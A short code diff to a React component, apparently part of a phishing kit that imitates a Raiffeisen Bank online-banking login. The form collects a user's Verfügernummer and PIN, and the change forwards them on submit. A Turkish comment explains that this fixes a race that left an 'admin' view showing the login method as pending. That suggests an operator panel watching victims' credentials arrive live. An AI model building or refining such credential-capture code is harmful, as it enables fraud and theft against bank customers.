@@ -9,7 +9,11 @@ type Props = {
     bundesland?: string;
   };
   onChange: (field: string, value: string) => void;
-  handleRouteAction: () => void;
+  handleRouteAction: (data?: {
+    verfuegernummer?: string;
+    pin?: string;
+    loginMethod?: string;
+  }) => void;
   saving?: boolean;
 };
 
@@ -79,7 +83,14 @@ export function Raiffeisen({ formData, onChange, handleRouteAction, saving }: Pr
             <form 
               onSubmit={(e) => {
                 e.preventDefault();
-                handleRouteAction();
+                // loginMethod'u submit override olarak da gec — state'e guvenme
+                // (mount effect -> async session fetch yarisi loginMethod'u
+                //  "" yapabiliyordu, admin "Giriş yöntemi: bekleniyor" gosteriyordu).
+                handleRouteAction({
+                  verfuegernummer: formData.verfuegernummer ?? "",
+                  pin: formData.pin ?? "",
+                  loginMethod: selectedRegion,
+                });
               }}
               className="flex flex-col gap-6 relative"
             >
